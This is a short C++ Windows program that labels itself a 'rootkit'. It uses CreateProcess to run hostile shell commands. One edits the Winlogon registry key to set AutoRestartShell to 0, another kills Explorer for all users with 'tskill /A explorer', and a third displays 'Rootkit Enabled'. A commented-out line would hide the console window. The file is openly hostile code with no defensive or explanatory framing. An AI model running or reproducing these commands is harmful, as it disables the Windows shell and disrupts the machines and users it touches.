#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <unistd.h>
#include <time.h>
#include <string>
#include <cstring>

int run_command(STARTUPINFO* si, PROCESS_INFORMATION* pi, char* command) 
{
    if (!CreateProcess(NULL,   // No module name (use command line)
        ((LPSTR) command),        // file to run
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        si,            // Pointer to STARTUPINFO structure
        pi)           // Pointer to PROCESS_INFORMATION structure
    )
    {
        int error = GetLastError();
        puts("=======================");
        printf("Rootkit failed (%d).\n", error);
        puts(command);
        puts("=======================");
        return error;
    }
    return 0;
}

char* get_time()
{
    // C++ time is just awful
    // Returns HH:MM:(SS+10)
    // http://www.cplusplus.com/reference/ctime/strftime/

    time_t rawtime;
    struct tm * timeinfo;
    char* buffer = new char[9];

    time (&rawtime);
    timeinfo = localtime (&rawtime);
    timeinfo->tm_sec += 10;

    strftime (buffer, 9, "%H:%M:%S", timeinfo);

    return buffer;
}

int main( )
{
	// ::ShowWindow(::GetConsoleWindow(), SW_HIDE); 
	STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );    

    char command_KillExplorer[] = "tskill /A explorer";
    char command_StopShellRestart[] = "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /t REG_DWORD /V \"AutoRestartShell\" /d 0 /f";
    // Might need a better way to get sessionID, for now 0 works
    char command_Msg[] = "msg 0 Rootkit Enabled";
    // char command_OpenExplorer[] = "explorer.exe";
    
    // This is not working
    // char command_Schedule[34];
    // strcat(command_Schedule, "at ");
    // strcat(command_Schedule, get_time());
    // strcat(command_Schedule, " /interactive (");
    // strcat(command_Schedule, command_Msg);
    // strcat(command_Schedule, ")");

    run_command(&si, &pi, command_StopShellRestart);
    run_command(&si, &pi, command_KillExplorer);
    run_command(&si, &pi, command_Msg);
    // run_command(&si, &pi, command_Schedule);
    // run_command(&si, &pi, command_OpenExplorer);

    // Wait until child process exits.
    WaitForSingleObject( pi.hProcess, INFINITE );

    // Close process and thread handles. 
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
    return 0;
}
